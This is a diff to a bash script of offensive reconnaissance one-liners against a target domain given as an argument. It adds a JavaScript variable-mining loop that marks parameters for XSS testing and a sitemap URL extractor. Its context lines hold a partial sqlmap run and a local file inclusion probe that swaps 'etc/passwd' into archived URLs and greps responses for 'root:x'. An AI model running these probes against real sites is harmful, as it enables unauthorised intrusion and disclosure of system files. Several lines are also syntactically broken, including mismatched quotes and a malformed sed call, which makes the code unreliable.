@@ -1,6 +1,6 @@
 #! /bin/bash 
 
-#Tools to have installed locally to run these scripts
+#Open source CLI Tools to have installed locally to run these scripts
 #subfinder
 #assetfinder
 #amass 
@@ -9,6 +9,7 @@
 #uro
 #dalfox
 #anew 
+#xmllint
 #Waybackurls
 
 #Finding Subdomain Takeovers
@@ -25,3 +26,8 @@ sqlmap -m sqli.txt --d
 #Local File Inclusion
 waybackurls $1 | sort -u | gf lfi | qsreplace "etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo Vuln! %"
 
+#Javascript Files Mining
+assetfinder --subs-only $1 | gau | egrep -v '(.css|.png|.jpg|.jpeg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url |grep -Eo "var [a-zA-Z0-9_]+" |sed -e 's, 'var', '"$url"'?', g' -e 's/ //g' | grep -v '.js' | sed  's/.*/&==xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
+
+#Get Urls from sitemap.xml
+curl -s http://$1/sitemap.xml | xmllint --format - | grep -e 'loc' |sed -r 's|<?loc>||g'
